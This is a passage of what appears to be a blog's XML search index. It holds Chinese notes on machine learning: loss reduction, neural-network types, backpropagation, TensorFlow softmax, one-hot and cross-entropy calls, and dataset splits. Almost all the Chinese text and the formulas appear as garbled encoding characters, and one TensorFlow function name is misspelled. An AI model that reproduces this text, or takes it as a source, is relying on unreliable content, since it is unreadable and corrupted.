å¾—åˆ°çš„åˆ†ç±»è¾¹ç•Œç”±è‹¥å¹²ä¸ªå¹³è¡Œè½´çš„åˆ†æ®µç»„æˆ</p><p>ä½¿ç”¨å¤šå˜é‡å†³ç­–æ ‘æ—¶ï¼Œæ¯ä¸ªéå¶èŠ‚ç‚¹æ˜¯é’ˆå¯¹æ‰€æœ‰å±æ€§åŠ æƒå¹³å‡å®ç°çš„çº¿æ€§åˆ†ç±»å™¨</p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ML å°çŸ¥è¯†</title>
      <link href="/blog/2021/07/15/ml/ml_skills/"/>
      <url>/blog/2021/07/15/ml/ml_skills/</url>
      
        <content type="html"><![CDATA[<h2 id="loss-reduction-when-to-use-sum-and-when-mean">Loss reduction:when to use sum and when meanï¼Ÿ</h2><p>Loss reduction ä¸€èˆ¬ä½¿ç”¨ meanï¼ŒåŸå› æ˜¯å…¶å®ä½¿ç”¨ sum å’Œ meanåŒºåˆ«ä¸å¤§ï¼Œä½¿ç”¨ sum å°±æ˜¯å¯¹æ¯æ¬¡æ¢¯åº¦è¿›è¡Œç´¯åŠ ï¼Œè€Œä½¿ç”¨ mean å°±æ˜¯ç´¯åŠ ä¹‹åé™¤ä»¥batch sizeï¼Œ äºŒè€…å·®ä¸€ä¸ª batch size å¤§å°ã€‚è€Œä¸ºäº†è§£è€¦åˆï¼Œé¿å…è°ƒæ•´ batchsize çš„æ—¶å€™å½±å“è®¡ç®—å‡ºæ¥çš„æ¢¯åº¦ï¼Œä»è€Œå½±å“äº‹å…ˆè°ƒå¥½çš„å­¦ä¹ ç‡ï¼Œä¸€èˆ¬ä½¿ç”¨meanï¼Œè¿™æ ·å³ä½¿è°ƒèŠ‚ batch sizeï¼Œæ¢¯åº¦å¤§å°ä¹Ÿä¸ä¼šå˜åŒ–ï¼Œæœ€ä½³å­¦ä¹ ç‡ä¹Ÿä¸ä¼šæ”¹å˜ã€‚</p><ol type="1"><li><ahref="https://stats.stackexchange.com/questions/453301/loss-reduction-when-to-use-sum-and-when-mean">neuralnetworks - Loss reduction: when to use sum and when mean? - CrossValidated</a></li><li><ahref="https://stats.stackexchange.com/questions/358786/mean-or-sum-of-gradients-for-weight-updates-in-sgd">neuralnetworks - Mean or sum of gradients for weight updates in SGD - CrossValidated</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è¥¿ç“œä¹¦ç¬¬äº”ç« -ç¥ç»ç½‘ç»œ</title>
      <link href="/blog/2021/07/15/ml/neural_network/"/>
      <url>/blog/2021/07/15/ml/neural_network/</url>
      
        <content type="html"><![CDATA[<h1 id="è¥¿ç“œä¹¦ç¬¬äº”ç« ">è¥¿ç“œä¹¦ç¬¬äº”ç« </h1><h2 id="ç¥ç»å…ƒæ¨¡å‹">ç¥ç»å…ƒæ¨¡å‹</h2><p>M-P ç¥ç»å…ƒæ¨¡å‹ï¼šnä¸ªå…¶ä»–å•å…ƒçš„è¾“å…¥ä¿¡å·é€šè¿‡å¸¦æƒé‡çš„è¿æ¥ï¼Œæ€»çš„è¾“å…¥å€¼ä¸é˜ˆå€¼æ¯”è¾ƒï¼Œé€šè¿‡æ¿€æ´»å‡½æ•°å¤„ç†äº§ç”Ÿè¾“å‡ºã€‚</p><p>å¸¸è§çš„æ¿€æ´»å‡½æ•°æœ‰é˜¶è·ƒå‡½æ•°å’Œ Sigmoid å‡½æ•° 11+ğ‘’âˆ’ğ‘¥ã€‚</p><h2 id="æ„ŸçŸ¥æœºä¸å¤šå±‚ç½‘ç»œ">æ„ŸçŸ¥æœºä¸å¤šå±‚ç½‘ç»œ</h2><p>æ„ŸçŸ¥æœºä¸ºä¸¤å±‚ç½‘ç»œï¼Œä¸€å±‚è¾“å…¥ä¸€å±‚è¾“å‡ºã€‚å­¦ä¹ ç›®æ ‡ä¸ºæƒé‡å’Œé˜ˆå€¼ï¼Œå…¶ä¸­é˜ˆå€¼çš„å­¦ä¹ ä¹Ÿå¯ä»¥è½¬åŒ–ä¸ºæƒé‡ã€‚</p><p>å­¦ä¹ è¿‡ç¨‹ä¸º ğ‘¤ğ‘–â†ğ‘¤ğ‘–+Î”ğ‘¤ğ‘–ï¼ŒÎ”ğ‘¤ğ‘–=ğœ‚(ğ‘¦âˆ’ğ‘¦Ì‚ )ğ‘¥ğ‘–ï¼Œå…¶ä¸­ ğœ‚ ä¸ºå­¦ä¹ ç‡ã€‚</p><p>å¯ä»¥è¯æ˜çº¿æ€§å¯åˆ†çš„é—®é¢˜ï¼ˆå¯ä»¥ä½¿ç”¨çº¿æ€§è¶…å¹³é¢åˆ’åˆ†ï¼‰ä½¿ç”¨æ„ŸçŸ¥æœºå­¦ä¹ å¯ä»¥æ”¶æ•›ã€‚</p><p>è§£å†³çº¿æ€§ä¸å¯åˆ†çš„é—®é¢˜è¦ä½¿ç”¨å¤šå±‚ç¥ç»å…ƒï¼Œåœ¨è¾“å…¥å’Œè¾“å‡ºä¹‹é—´æ·»åŠ éšå«å±‚ã€‚</p><p>å¾—åˆ°å¤šå±‚å‰é¦ˆç¥ç»ç½‘ç»œï¼Œå³ä¸å­˜åœ¨åŒå±‚è¿æ¥å’Œè·¨å±‚è¿æ¥ã€‚</p><h2 id="è¯¯å·®é€†ä¼ æ’­ç®—æ³•">è¯¯å·®é€†ä¼ æ’­ç®—æ³•</h2><p>backpropagation ç®—æ³•ï¼Œç”¨äºè®­ç»ƒå¤šå±‚å‰é¦ˆç¥ç»ç½‘ç»œã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œè®­ç»ƒé›†ä¸­çš„è¾“å…¥æ•°æ®å’Œè¾“å‡ºæ•°æ®ä¸ºå¤šç»´å‘é‡ï¼ˆç¦»æ•£å±æ€§çš„å¤„ç†ï¼‰ã€‚</p><p>BP æ˜¯è¿­ä»£å­¦ä¹ ç®—æ³•ï¼Œæ¯ä¸€è½®ä¸­ä½¿ç”¨å¹¿ä¹‰æ„ŸçŸ¥æœºçš„å­¦ä¹ è§„åˆ™ ğ‘£â†ğ‘£+Î”ğ‘£æ›´æ–°å‚æ•°ã€‚</p><p>ä½¿ç”¨æ¢¯åº¦ä¸‹é™å­¦ä¹ ç­–ç•¥ï¼Œä»¥ç›®æ ‡çš„è´Ÿæ¢¯åº¦æ–¹å‘è°ƒæ•´å‚æ•°ï¼Œä½¿ç”¨å­¦ä¹ ç‡è°ƒèŠ‚æ­¥é•¿ã€‚</p><p>è¾“å‡ºå€¼ç›¸å¯¹æƒå€¼çš„æ¢¯åº¦çš„è®¡ç®—æ ¹æ®é“¾å¼æ³•åˆ™ç”±æ¿€æ´»å‡½æ•°å’Œæ¯ä¸€å±‚çš„è¾“å…¥å€¼å†³å®šã€‚</p><p>ä¸Šè¿°æ ‡å‡† BP ç®—æ³•æ¯æ¬¡é’ˆå¯¹ä¸€ä¸ªæ ·ä¾‹æ›´æ–°å‚æ•°ã€‚</p><p>ç´¯è®¡ BPç®—æ³•è¯»å–ä¸€éè®­ç»ƒé›†ï¼ˆepochï¼‰å¹¶å¾—åˆ°ç´¯è®¡è¯¯å·®ï¼Œä»è€Œè¿›è¡Œå‚æ•°æ›´æ–°ï¼Œæ›´æ–°é¢‘ç‡æ¯”è¾ƒä½ã€‚</p><p>ä¸ºäº†é˜²æ­¢è¿‡æ‹Ÿåˆï¼Œå¯ä»¥é‡‡ç”¨ä¸¤ç§ç­–ç•¥</p><p>æ—©åœï¼šè®­ç»ƒé›†åˆ†å‡ºä¸€éƒ¨åˆ†éªŒè¯é›†ï¼Œè®­ç»ƒé›†è¯¯å·®é™ä½è€ŒéªŒè¯é›†è¯¯å·®å‡é«˜æ—¶åœæ­¢è®­ç»ƒã€‚</p><p>æ­£åˆ™åŒ–ï¼šç›®æ ‡å‡½æ•°ä¸­å¢åŠ ä¸€ä¸ªè¡¨ç¤ºç½‘ç»œå¤æ‚åº¦çš„æˆåˆ†ï¼Œä¾‹å¦‚æƒå€¼å¹³æ–¹å’Œå¾—åˆ°ğ¸=ğœ†1ğ‘šâˆ‘ğ¸ğ‘˜+(1âˆ’ğœ†)âˆ‘ğ‘¤2ğ‘–ã€‚</p><h2 id="å…¨å±€æœ€å°ä¸å±€éƒ¨æå°">å…¨å±€æœ€å°ä¸å±€éƒ¨æå°</h2><p>è¯¯å·®ç›®æ ‡å‡½æ•°å¯ä»¥çœ‹ä½œå‚æ•°å€¼çš„å‡½æ•°ã€‚ç¥ç»ç½‘ç»œçš„è®­ç»ƒè¿‡ç¨‹ä¸ºå¯»æ‰¾æœ€ä¼˜çš„ä¸€ç»„å‚æ•°å€¼ã€‚</p><p>å­˜åœ¨å…¨å±€æœ€å°å€¼å’Œå±€éƒ¨æå°å€¼ï¼Œåè€…è¡¨ç¤ºé‚»åŸŸå†…çš„è¯¯å·®å‡½æ•°éƒ½å¤§äºè¯¥ç‚¹ã€‚</p><p>æ¢¯åº¦ä¸º 0çš„ç‚¹å¯ä»¥æ˜¯å±€éƒ¨æå°å€¼ç‚¹ã€‚åŸºäºæ¢¯åº¦çš„æœç´¢ç­–ç•¥å¯èƒ½è½å…¥å±€éƒ¨æå°å€¼ç‚¹ã€‚</p><p>å¸¸è§è·³å‡ºå±€éƒ¨æœ€ä¼˜å€¼çš„æ–¹æ³•æœ‰ï¼š</p><p>å¤šç»„ä¸åŒçš„å‚æ•°åˆå§‹åŒ–ï¼šä»ä¸åŒçš„åˆå§‹å€¼å¼€å§‹æœç´¢ã€‚</p><p>æ¨¡æ‹Ÿé€€ç«ï¼šå‚æ•°æ›´æ–°æ—¶ä»¥ä¸€å®šçš„æ¦‚ç‡æ¥å—æ¬¡ä¼˜è§£ï¼ˆæ­¤æ¦‚ç‡é€æ¸å‡å°ï¼‰</p><p>éšå³æ¢¯åº¦ä¸‹é™æ³•</p><h2 id="å…¶ä»–å¸¸è§ç¥ç»ç½‘ç»œ">å…¶ä»–å¸¸è§ç¥ç»ç½‘ç»œ</h2><h3 id="rbf-ç½‘ç»œ">RBF ç½‘ç»œ</h3><p>å¾„å‘åŸºå‡½æ•°ç½‘ç»œï¼Œé€šå¸¸ä¸ºå•éšå±‚ç½‘ç»œï¼Œä½¿ç”¨å¾„å‘åŸºå‡½æ•°ä½œä¸ºæ¿€æ´»å‡½æ•°ã€‚</p><p>é«˜æ–¯å¾„å‘åŸºå‡½æ•° ğœŒ(ğ‘¥,ğ‘ğ‘–)=ğ‘’âˆ’ğ›½ğ‘–||ğ‘¥âˆ’ğ‘ğ‘–||2ã€‚</p><h3 id="art-ç½‘ç»œ">ART ç½‘ç»œ</h3><p>è‡ªé€‚åº”è°æŒ¯ç†è®ºç½‘ç»œã€‚ä½¿ç”¨ç«äº‰å­¦ä¹ çš„æ€æƒ³è¿›è¡Œæ— ç›‘ç£å­¦ä¹ ã€‚</p><p>ç«äº‰å­¦ä¹ ä¸­æ¯ä¸€æ—¶åˆ»ä»…æœ‰ä¸€ä¸ªç«äº‰è·èƒœçš„ç¥ç»å…ƒè¢«æ¿€æ´»ï¼Œå…¶ä»–çš„è¢«æŠ‘åˆ¶ã€‚</p><p>è¯†åˆ«å±‚æ¯ä¸ªç¥ç»å…ƒè®°å½•ä¸€ä¸ªæ¨¡å¼ç±»ã€‚è®¡ç®—è¾“å…¥å‘é‡ä¸æ¯ä¸ªç¥ç»å…ƒçš„è·ç¦»å€¼ï¼Œå¦‚æœè·ç¦»å°äºè®¾å®šçš„é˜ˆå€¼åˆ™æ¿€æ´»æŸä¸€ä¸ªç¥ç»å…ƒå¹¶æŠ‘åˆ¶å…¶ä»–çš„ï¼ŒåŒæ—¶æ›´æ–°å‚æ•°ã€‚å¦‚æœè·ç¦»éƒ½å¤§äºé˜ˆå€¼åˆ™å°†è¾“å…¥å‘é‡è®¾ç½®ä¸ºæ–°çš„ä¸€ç±»ã€‚</p><p>ART ç½‘ç»œç¼“è§£äº†å¯å¡‘æ€§-ç¨³å®šæ€§çª˜å¢ƒã€‚å¯ä»¥å¢é‡å­¦ä¹ å’Œåœ¨çº¿å­¦ä¹ ã€‚</p><h3 id="som-ç½‘ç»œ">SOM ç½‘ç»œ</h3><p>è‡ªç»„ç»‡(ç‰¹å¾)æ˜ å°„ç½‘ç»œã€‚å°†é«˜ç»´æ•°æ®æ˜ å°„åˆ°ä½ç»´ç©ºé—´å¹¶ä¿æŒæ•°æ®ç‚¹ä¹‹é—´çš„æ‹“æ‰‘å…³ç³»ã€‚</p><p>è¾“å‡ºå±‚ç¥ç»å…ƒæŒ‰çŸ©é˜µå½¢å¼æ’åˆ—ã€‚</p><p>è®­ç»ƒæ—¶æ ¹æ®è¾“å…¥é€‰æ‹©æ¿€æ´»çš„ç¥ç»å…ƒï¼ŒåŒæ—¶æ›´æ–°æƒå€¼ä½¿ä¸´è¿‘ç¥ç»å…ƒä¸å½“å‰æ ·æœ¬è·ç¦»å‡å°ã€‚</p><h3 id="çº§è”ç›¸å…³ç½‘ç»œ">çº§è”ç›¸å…³ç½‘ç»œ</h3><p>å±äºä¸€ç§ç»“æ„è‡ªé€‚åº”ç½‘ç»œï¼Œç½‘ç»œç»“æ„ä¹Ÿæ˜¯å­¦ä¹ ç›®æ ‡ä¹‹ä¸€ã€‚</p><p>åˆå§‹æƒ…å†µåªæœ‰è¾“å…¥å’Œè¾“å‡ºï¼Œè®­ç»ƒè¿‡ç¨‹ä¸­é€æ¸å¢åŠ éšå±‚å•å…ƒï¼Œé€šè¿‡æœ€å¤§åŒ–æ–°å•å…ƒçš„è¾“å‡ºå’Œè¯¯å·®å‡½æ•°çš„ç›¸å…³æ€§æ¥è®­ç»ƒå‚æ•°ã€‚</p><h3 id="elman-ç½‘ç»œ">Elman ç½‘ç»œ</h3><p>æ˜¯æœ€å¸¸ç”¨çš„é€’å½’ç¥ç»ç½‘ç»œä¹‹ä¸€ï¼Œç½‘ç»œçš„è¾“å‡ºä¸ä»…å–å†³äºå½“å‰è¾“å…¥è¿˜å–å†³äºä¸Šä¸€æ—¶é—´æ­¥çš„è¾“å‡ºã€‚</p><p>éšå±‚ç¥ç»å…ƒçš„è¾“å‡ºå‚ä¸ä¸‹ä¸€æ—¶åˆ»çš„è¾“å…¥ã€‚</p><h3 id="boltzmann-æœº">Boltzmann æœº</h3><p>åŸºäºèƒ½é‡çš„æ¨¡å‹ã€‚</p><p>ä½¿ç”¨<span class="math inline">\(s_i\)</span> è¡¨ç¤ºå•å…ƒçš„çŠ¶æ€ï¼Œ<spanclass="math inline">\(w_{ij}\)</span> è¡¨ç¤ºæƒå€¼ï¼Œ<spanclass="math inline">\(\theta_i\)</span>è¡¨ç¤ºé˜ˆå€¼ã€‚</p><p>å®šä¹‰èƒ½é‡ ğ¸(ğ‘ )=âˆ’âˆ‘âˆ‘ğ‘¤ğ‘–ğ‘—ğ‘ ğ‘–ğ‘ ğ‘—âˆ’âˆ‘ğœƒğ‘–ğ‘ ğ‘–ã€‚æ¦‚ç‡ ğ‘ƒ(ğ‘ )=ğ‘’âˆ’ğ¸(ğ‘ )âˆ‘ğ‘’âˆ’ğ¸(ğ‘ )ã€‚</p><p>è®­ç»ƒè¿‡ç¨‹ä¸ºå°†è®­ç»ƒæ ·æœ¬çœ‹ä½œçŠ¶æ€å‘é‡å¹¶ä½¿å…¶æ¦‚ç‡å°½å¯èƒ½å¤§ã€‚</p><p>å…·ä½“ä½¿ç”¨ä¸­å¸¸ç”¨å—é™ Boltzmann æœºï¼Œå¹¶ä½¿ç”¨ CD ç®—æ³•è¿›è¡Œè®­ç»ƒã€‚</p><h3 id="æ·±åº¦å­¦ä¹ ">æ·±åº¦å­¦ä¹ </h3><p>å…¸å‹æ·±åº¦å­¦ä¹ æ¨¡å‹å°±æ˜¯æ·±å±‚çš„ç¥ç»ç½‘ç»œï¼Œé€šè¿‡å¢åŠ éšå±‚çš„æ•°é‡æ¥å¢åŠ æ¨¡å‹å¤æ‚åº¦ã€‚</p><p>å¤šéšå±‚çš„ç¥ç»ç½‘ç»œéš¾ä»¥ç›´æ¥ä½¿ç”¨ BPç®—æ³•è®­ç»ƒï¼Œä¼šå‡ºç°ä¸æ”¶æ•›çš„æƒ…å†µã€‚ä¸»è¦æœ‰ä¸¤ç§è§£å†³æ–¹æ³•ã€‚</p><p>ä½¿ç”¨æ— ç›‘ç£é€å±‚è®­ç»ƒçš„æ–¹æ³•ï¼Œæ¯æ¬¡è®­ç»ƒä¸€å±‚éšèŠ‚ç‚¹ï¼Œç§°ä¸ºé¢„è®­ç»ƒï¼Œå…¨éƒ¨å®Œæˆåè¿›è¡Œå¾®è°ƒã€‚</p><p>ä½¿ç”¨æƒå…±äº«çš„æ€è·¯ï¼Œè®©ä¸€ç»„ç¥ç»å…ƒä½¿ç”¨ç›¸åŒçš„æƒã€‚åœ¨å·ç§¯ç¥ç»ç½‘ç»œä¸­æœ‰éå¸¸é‡è¦çš„ä½œç”¨ã€‚</p><p>ï¼ˆåœ¨ CNNä¸­æ¯ä¸ªå·ç§¯å±‚åŒ…å«å¤šä¸ªç‰¹å¾æ˜ å°„ï¼Œæ¯ä¸ªæ± åŒ–å±‚åŸºäºå±€éƒ¨ç›¸å…³æ€§åŸç†è¿›è¡Œå‹é‡‡æ ·ï¼Œå…¶ä¸­æ¯ä¸€ç»„ç¥ç»å…ƒéƒ½ä½¿ç”¨ç›¸åŒçš„è¿æ¥æƒï¼Œå‡å°‘å‚æ•°æ•°é‡ã€‚ï¼‰</p><p>æ·±åº¦å­¦ä¹ å¯ä»¥ç†è§£ä¸ºç‰¹å¾å­¦ä¹ æˆ–è€…è¡¨ç¤ºå­¦ä¹ ã€‚ä¼ ç»Ÿæœºå™¨å­¦ä¹ ä¸­é€šè¿‡äººå·¥è®¾è®¡æ ·æœ¬ç‰¹å¾ï¼Œè€Œç‰¹å¾å­¦ä¹ é€šè¿‡æœºå™¨å­¦ä¹ æŠ€æœ¯è‡ªé€‚åº”äº§ç”Ÿç‰¹å¾ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¥ç»ç½‘ç»œ</title>
      <link href="/blog/2021/07/15/ml/neural_network2/"/>
      <url>/blog/2021/07/15/ml/neural_network2/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¥ç»ç½‘ç»œ">ç¥ç»ç½‘ç»œ</h1><p>ç¥ç»ç½‘ç»œï¼šäººè„‘æ™ºæ…§çš„ç‰©è´¨åŸºç¡€ç¥ç»å…ƒ/ç¥ç»ç»†èƒï¼šç”Ÿç‰©ç¥ç»ç³»ç»Ÿçš„åŸºæœ¬å•å…ƒ</p><p>M-P ç¥ç»å…ƒæ¨¡å‹ -1943 å¹´</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154640537334.jpg"alt="m-p" /><figcaption aria-hidden="true">m-p</figcaption></figure><p>è¾“å…¥ä¿¡å·ç”¨æ¥æ¨¡æ‹Ÿç¥ç»å…ƒçš„æ ‘çªï¼Œè¿™äº›ä¿¡å·çš„æ¥æºä¸åŒï¼Œå½±å“ä¸åŒï¼Œå› æ­¤ä¸ºä»–ä»¬åˆ†é…ä¸åŒçš„æƒé‡ã€‚</p><p>è®¡ç®—å•å…ƒæ¨¡æ‹Ÿç»†èƒæ ¸ï¼Œå°†æ¥æ”¶åˆ°çš„è¾“å…¥ä¿¡å·åŠ æƒæ±‚å’Œä¹‹åï¼Œä¸äº§ç”Ÿå…´å¥‹çš„ä¸­é—´ç»“æœç›¸æ¯”è¾ƒå¾—åˆ°ä¸­é—´ç»“æœzã€‚</p><p>æœ€åï¼Œé€šè¿‡é˜¶è·ƒå‡½æ•°æ¨¡æ‹Ÿç¥ç»å…´å¥‹ã€‚é˜¶è·ƒå‡½æ•°è¢«ç§°ä¸ºæ¿€æ´»å‡½æ•°/æ¿€åŠ±å‡½æ•°(activationfunctions)</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154641566100.jpg"alt="16154641566100" /><figcaption aria-hidden="true">16154641566100</figcaption></figure><p>æƒå€¼å‘é‡ W æ— æ³•è‡ªåŠ¨å­¦ä¹ å’Œæ›´æ–°,<strong>ä¸å…·å¤‡å­¦ä¹ çš„èƒ½åŠ›</strong></p><p>æ„ŸçŸ¥æœºæ¨¡å‹ - 1957 å¹´ æ„ŸçŸ¥æœºæ¨¡å‹åˆ†ä¸ºä¸¤å±‚ï¼Œè¾“å…¥å±‚æ¥å—å¤–ç•Œä¿¡å·ï¼Œè¾“å‡ºå±‚ä¸ºM-P ç¥ç»å…ƒï¼Œå¿½ç•¥ MP ç¥ç»å…ƒçš„ç»†èŠ‚ï¼Œå¯ä»¥ç®€åŒ–ä¸ºå³ä¸‹å›¾å½¢å¼ã€‚</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154645063032.jpg"alt="16154645063032" />è¾“å…¥å±‚ä¸å‘ç”Ÿè®¡ç®—ï¼Œå› æ­¤ä¸è®¡å…¥ç¥ç»ç½‘ç»œçš„å±‚æ•°ï¼Œåªæœ‰è¾“å‡ºå±‚æ˜¯å‘ç”Ÿè®¡ç®—çš„åŠŸèƒ½ç¥ç»å…ƒï¼Œå› æ­¤æ„ŸçŸ¥æœºæ˜¯å•å±‚ç¥ç»ç½‘ç»œã€‚</p><p>æ„ŸçŸ¥æœºè®­ç»ƒæ³•åˆ™ï¼š <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154646111140.jpg"alt="16154646111140" /></p><p>è‡ªåŠ¨è°ƒæ•´æƒå€¼ï¼Œå…·å¤‡å­¦ä¹ èƒ½åŠ› ç¬¬ä¸€ä¸ªç”¨ç®—æ³•æ¥ç²¾ç¡®å®šä¹‰çš„ç¥ç»ç½‘ç»œæ¨¡å‹çº¿æ€§äºŒåˆ†ç±»çš„åˆ†ç±»å™¨æ„ŸçŸ¥æœºç®—æ³•å­˜åœ¨å¤šä¸ªè§£ï¼Œæ”¶åˆ°æƒå€¼å‘é‡åˆå§‹å€¼ï¼Œé”™è¯¯æ ·æœ¬é¡ºåºçš„å½±å“ã€‚å¯¹äºéçº¿æ€§å¯åˆ†çš„æ•°æ®é›†ï¼Œæ„ŸçŸ¥æœºè®­ç»ƒæ³•ï¼Œåˆ™æ— æ³•æ”¶æ•›</p><p>Delta æ³•åˆ™ä½¿ç”¨<strong>æ¢¯åº¦ä¸‹é™æ³•</strong>ï¼Œæ‰¾åˆ°èƒ½å¤Ÿ<strong>æœ€ä½³æ‹Ÿåˆ</strong>è®­ç»ƒæ ·æœ¬é›†çš„æƒå‘é‡ã€‚<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154654128122.jpg"alt="16154654128122" /></p><p>å› ä¸ºé˜¶è·ƒå‡½æ•°å…·æœ‰ä¸è¿ç»­ï¼Œä¸å…‰æ»‘ç­‰ä¸å¤ªå¥½çš„æ€§è´¨ï¼Œå®é™…ä¸­ï¼Œç»å¸¸ä½¿ç”¨sigmod() å‡½æ•°ä½œä¸ºæ¿€æ´»å‡½æ•°ã€‚ é€»è¾‘å›å½’å¯ä»¥çœ‹åšå•å±‚ç¥ç»ç½‘ç»œ</p><p>å¤šåˆ†ç±»é—®é¢˜ï¼šè®¾ç½®å¤šä¸ªè¾“å‡ºèŠ‚ç‚¹ï¼Œåœ¨è¾“å‡ºå±‚ä½¿ç”¨ soft maxä½œä¸ºæ¿€æ´»å‡½æ•°ï¼Œå¾—åˆ°ä¸åŒç§ç±»çš„æ¦‚ç‡ã€‚ <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154655651165.jpg"alt="16154655651165" /></p><h2 id="å®ç°å•å±‚ç¥ç»ç½‘ç»œ">å®ç°å•å±‚ç¥ç»ç½‘ç»œ</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154682238736.jpg"alt="16154682238736" /><figcaption aria-hidden="true">16154682238736</figcaption></figure><p>ç¥ç»ç½‘ç»œçš„è®¾è®¡</p><ol type="1"><li>ç¥ç»ç½‘ç»œçš„ç»“æ„ç¡®å®šæœ‰å‡ å±‚ï¼Œæ¯å±‚æœ‰å‡ ä¸ªèŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹ä¹‹é—´æ—¶å¦‚ä½•è¿æ¥çš„ï¼Œä½¿ç”¨ä»€ä¹ˆæ¿€æ´»å‡½æ•°å•å±‚å‰é¦ˆå‹ç¥ç»ç½‘ç»œ</li><li>æ¿€æ´»å‡½æ•° åˆ†ç±»é—®é¢˜ä½¿ç”¨ softmax å‡½æ•°ä½œä¸ºæ¿€æ´»å‡½æ•° æ ‡ç­¾å€¼ä½¿ç”¨ one-hotencoding è¡¨ç¤º</li><li>æŸå¤±å‡½æ•° ä½¿ç”¨äº¤å‰ç†µæŸå¤±å‡½æ•°æ¥è®¡ç®—è¯¯å·®</li></ol><p>ç¥ç»ç½‘ç»œæ˜¯æ•°å­¦æ¨¡å‹ï¼ŒèŠ‚ç‚¹ä¸èŠ‚ç‚¹ä¹‹é—´çš„å…³ç³»æ˜¯æ•°å­¦è¿ç®—ï¼Œé€šè¿‡å¤šç»´æ•°ç»„æ¥å®ç°è¿™äº›æ•°å­¦è¿ç®—ã€‚<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154686163797.jpg"alt="16154686163797" /></p><ol type="1"><li><p>softmax å‡½æ•° <code>tf.nn.softmax()</code>ï¼Œ<code>tf.nn.softmax(tf.matmul(X-train, W)+b)</code></p></li><li><p>one-hot encoding <code>tf.one_hot(indices, depth)</code>indices:è¾“å…¥å€¼ï¼Œè¦æ±‚æ˜¯ä¸€ä¸ªæ•´æ•° depthï¼šæ·±åº¦<code>tf.one_hot(tf.constant(y_test, dtype=tf.int32), 3)</code></p></li><li><p>äº¤å‰ç†µæŸå¤±å‡½æ•°<code>tf.keras.losses.categorical_croossentropy(y_true, y_pred)</code>y_true: è¡¨ç¤ºä¸º one-hot encoding çš„æ ‡ç­¾å€¼ y_pred: è¡¨ç¤ºä¸º softmaxå‡½æ•°çš„è¾“å‡º</p></li><li><p>å¹³å‡äº¤å‰ç†µæŸå¤±tf.reduce_mean(tf.keras.losses.categorical_crossentropy(y_true =T_train, y_pred=PRED_train))ä¹Ÿå¯ä»¥ä½¿ç”¨æ±‚å’Œå‡½æ•°å¾—åˆ°æ€»çš„äº¤å‰ç†µæŸå¤±</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è®­ç»ƒé›†ï¼ŒéªŒè¯é›†å’Œæµ‹è¯•é›†</title>
      <link href="/blog/2021/07/15/ml/train_test_eval_dataset/"/>
      <url>/blog/2021/07/15/ml/train_test_eval_dataset/</url>
      
        <content type="html"><![CDATA[<p>ä¸‰ç§æ•°æ®é›†çš„ç›®çš„ï¼š</p><ul><li><p>è®­ç»ƒé›†ï¼šä¸»è¦ç›®çš„æ˜¯è®­ç»ƒæ¨¡å‹ã€‚</p></li><li><p>éªŒè¯é›†ï¼šç›®çš„æ˜¯ä¸ºäº†éªŒè¯ä¸åŒçš„ç®—æ³•ï¼Œæ£€éªŒå“ªç§ç®—æ³•æ›´æœ‰æ•ˆã€‚æ­£ç¡®è¯„ä¼°åˆ†ç±»å™¨çš„æ€§èƒ½ï¼Œé€‰å‡ºåˆé€‚çš„åˆ†ç±»å™¨ã€‚</p></li><li><p>æµ‹è¯•é›†ï¼šæµ‹è¯•é›†çš„ç›®çš„æ˜¯å¯¹æœ€ç»ˆæ‰€é€‰å®šçš„ç¥ç»ç½‘ç»œç³»ç»Ÿåšå‡ºæ— åä¼°è®¡ã€‚</p><p>æ— åä¼°è®¡ï¼šä¼°è®¡é‡çš„å‡å€¼ç­‰äºçœŸå®å€¼ï¼Œå³å…·ä½“æ¯ä¸€æ¬¡ä¼°è®¡å€¼å¯èƒ½å¤§äºçœŸå®å€¼ï¼Œä¹Ÿå¯èƒ½å°äºçœŸå®å€¼ï¼Œè€Œä¸èƒ½æ€»æ˜¯å¤§äºæˆ–å°äºçœŸå®å€¼ï¼ˆå› ä¸ºè¿™å°±äº§ç”Ÿäº†ç³»ç»Ÿè¯¯å·®ï¼‰</p></li></ul><ol type="1"><li>åœ¨æœ‰éªŒè¯é›†è®¾ç½®çš„æƒ…å†µä¸‹ï¼Œä½ çš„æ¨¡å‹å¯ä»¥ä»ä½ å¯¹è®­ç»ƒé›†çš„å¤šæ¬¡ä¸åŒåˆ†å‰²æ¥åæ¨å‡ºç±»ä¼¼ç»„åˆä¼˜åŒ–çš„æ¬¡æœ€ä¼˜è§£ï¼Œè€Œä½ å¦‚æœåªä½¿ç”¨è®­ç»ƒé›†ï¼Œä½ çš„è°ƒå‚ä¹‹é—´çš„æ¯æ¬¡è®­ç»ƒçš„ç›®æ ‡éƒ½å¿…ç„¶æ˜¯å½“å‰å…ˆéªŒçº¦æŸä¸‹çš„å±€éƒ¨æœ€ä¼˜è§£</li><li>è®­ç»ƒé›†æ˜¯ç”¨æ¥ fit ä½ çš„ model çš„ï¼›éªŒè¯é›†æ˜¯æ¥ tune ä½ çš„ modelçš„ï¼›æµ‹è¯•é›†æ˜¯æ¥ deploy ä½ çš„ model çš„ã€‚</li></ol><p>åˆ’åˆ†éªŒè¯é›†ä¸æµ‹è¯•é›†ï¼Œé€šè¿‡éªŒè¯é›†è¿›è¡Œè®­ç»ƒï¼Œä»è€Œå¢åŠ æ¨¡å‹çš„æ³›åŒ–æ€§èƒ½ï¼Œ</p><h2 